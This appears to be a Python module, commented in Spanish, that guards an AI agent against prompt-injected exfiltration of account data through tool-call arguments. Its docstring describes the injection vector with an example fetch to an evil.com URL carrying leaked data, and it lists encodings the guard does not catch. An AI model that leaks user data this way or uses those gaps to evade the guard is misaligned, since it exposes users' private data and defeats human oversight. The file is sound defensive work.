"""
exfil_guard.py — ANTI-EXFILTRACIÓN de datos de cuenta por args de tool (ticket 4, owner: seguridad).

EL VECTOR (invariante #4 de aleph-memoria-diseno.md §82-87): la memoria de cuenta entra al
contexto del modelo. Un tool output puede pedirle al modelo que "busque X" o "traiga la URL
Y", y el modelo mete DATOS DEL USUARIO en el parámetro de una tool de LECTURA:
    search(query="deuda de persona usuaria: 12345 en banco X")
    fetch(url="https://evil.com/log?leak=NRD-77341")
Eso EXFILTRA sin ser un send/pay — el gate de acción (verbos) no lo ve. Este guard mira los
ARGS SALIENTES de CADA tool-call (incluidas las READS) y, si arrastran un dato de cuenta que
efectivamente entró al framing, marca la llamada como consecuente → el runtime la degrada a
NEEDS_OK (el dueño decide; es SU dato, jamás se bloquea).

DISEÑO:
  • Puro, sin red, determinista → testeable unit y barato (corre por cada tool-call).
  • Matchea SÓLO lo que REALMENTE se inyectó (los contents de account_pinned) — el modelo no
    puede exfiltrar lo que nunca vio; esto acota los falsos positivos.
  • Normaliza el lado saliente: lowercase + URL-decode (unquote_plus, el caso literal del MD).
  • Exige señal FUERTE para no gatillar con hechos genéricos ("habla español"): un token
    saliente IDENTIFICANTE (con dígito o @ — tarjeta/cuenta/tel/email), o ≥2 tokens del hecho
    apareciendo juntos. Sin esto el agente de research se vuelve inusable (una palabra común
    larga como 'finanzas' o 'medicina' NO alcanza sola).
  • Es DEFENSA-EN-PROFUNDIDAD, no barrera hermética: no cubre base64/particionado/sinónimos.
    Por eso el spotlighting de outputs + el gate humano son capas, no adornos.
"""
from __future__ import annotations

import re
import urllib.parse
from typing import Iterable

_TOKEN_RE = re.compile(r"[a-záéíóúñü0-9_@.\-]{2,}", re.IGNORECASE)

# Tokens tan comunes que matchearlos sería ruido puro (no identifican al usuario).
_STOP = {
    "the", "and", "for", "que", "con", "los", "las", "una", "uno", "del", "por", "para",
    "está", "esta", "este", "eso", "más", "muy", "son", "como", "pero", "sus", "tus",
    "mis", "the", "you", "your", "with", "have", "que", "de", "en", "el", "la", "un",
}

MIN_BIGRAM_HITS = 2     # ≥2 tokens del hecho apareciendo juntos = señal (para palabras comunes)


def _is_identifying(tok: str) -> bool:
    """Un token es señal FUERTE por sí solo si IDENTIFICA al usuario: tiene un DÍGITO
    (NRD-77341, 12345, un número de tarjeta/cuenta) o un @ (email). Estos casi nunca colisionan
    con una búsqueda legítima.

    NO usamos la longitud como señal sola (era `len(tok) >= 8`): palabras comunes del dominio
    son largas — 'finanzas'(8), 'medicina'(8), 'presupuesto'(11), 'ingeniería'(10), 'guayaquil'(9)
    — y con un hecho de cuenta como 'trabaja en finanzas en Guayaquil' TODA búsqueda benigna de
    finanzas/medicina/la ciudad del usuario gatillaba el gate. Peor en runs AUTÓNOMOS (approve=None):
    el NEEDS_OK no se puede aprobar → la lectura NO se ejecuta y el research se rompe en seco. Justo
    los nichos #1/#2 (finanzas, ingeniería) — cuyos hechos y queries comparten vocabulario denso —
    eran los más golpeados. Una palabra puramente alfabética (nombre, ciudad, profesión) sólo cuenta
    para el BIGRAMA: hace falta que ≥2 tokens del hecho viajen juntos para marcar fuga. El dato
    realmente sensible (tarjeta/cuenta/tel/email) trae dígitos o @ y sigue cubierto por esta vía."""
    return any(c.isdigit() for c in tok) or "@" in tok


def _norm(s: str) -> str:
    """Normaliza el lado SALIENTE (args de la tool): URL-decode (unquote_plus cubre + y %XX)
    dos veces (defensa contra doble-encode) + lowercase + colapsa whitespace."""
    if not isinstance(s, str):
        try:
            s = str(s)
        except Exception:
            return ""
    prev = None
    # decodificar hasta punto fijo (máx 3 pasadas) — atrapa %252D → %2D → -
    for _ in range(3):
        if s == prev:
            break
        prev = s
        try:
            s = urllib.parse.unquote_plus(s)
        except Exception:
            break
    return re.sub(r"\s+", " ", s.lower()).strip()


def _fact_tokens(text: str) -> list[str]:
    """Tokens salientes de un hecho de cuenta, EN ORDEN (para el chequeo de bigramas)."""
    if not isinstance(text, str):
        return []
    out = []
    for t in _TOKEN_RE.findall(text.lower()):
        t = t.strip("._-@")
        if len(t) >= 3 and t not in _STOP:
            out.append(t)
    return out


def find_leaks(args_text: str, sensitive: Iterable[str]) -> list[str]:
    """Devuelve los hechos de cuenta (de `sensitive`) cuyos VALORES aparecen en el texto
    saliente `args_text`. Lista vacía = sin fuga. Un hecho matchea si:
      (a) alguno de sus tokens IDENTIFICANTES (con dígito o @) aparece en el saliente, o
      (b) ≥MIN_BIGRAM_HITS tokens del hecho aparecen (cubre datos partidos en tokens cortos,
          p.ej. 'calle 8 sur' → dos tokens cortos que juntos identifican).
    El match es sobre substring del texto normalizado (no palabra-exacta) para atrapar el dato
    incrustado en una URL/query."""
    hay = _norm(args_text)
    if not hay:
        return []
    leaks: list[str] = []
    for fact in sensitive or []:
        toks = _fact_tokens(fact)
        if not toks:
            continue
        # (a) un token IDENTIFICANTE del hecho aparece en el saliente → fuga
        if any(_is_identifying(t) and t in hay for t in toks):
            leaks.append(fact)
            continue
        # (b) ≥2 tokens del hecho aparecen → el dato viaja aunque sean palabras comunes
        hits = sum(1 for t in toks if t in hay)
        if hits >= MIN_BIGRAM_HITS:
            leaks.append(fact)
    return leaks


def args_to_text(args) -> str:
    """Aplana los args de una tool-call a un solo texto para escanear (valores anidados incluidos).
    No asume forma: dict/list/scalar. Escanea CLAVES **y** valores: el modelo elige los nombres de
    los campos, así que un dato de cuenta metido en una CLAVE (p.ej. {"deuda de persona usuaria 12345": "x"})
    exfiltraría igual — barato de cerrar, mismo umbral identificante/bigrama acota los falsos
    positivos."""
    parts: list[str] = []

    def walk(v):
        if isinstance(v, dict):
            for k, vv in v.items():
                parts.append(str(k))
                walk(vv)
        elif isinstance(v, (list, tuple)):
            for vv in v:
                walk(vv)
        elif v is not None:
            parts.append(str(v))

    walk(args)
    return " ".join(parts)


__all__ = ["find_leaks", "args_to_text", "MIN_BIGRAM_HITS"]
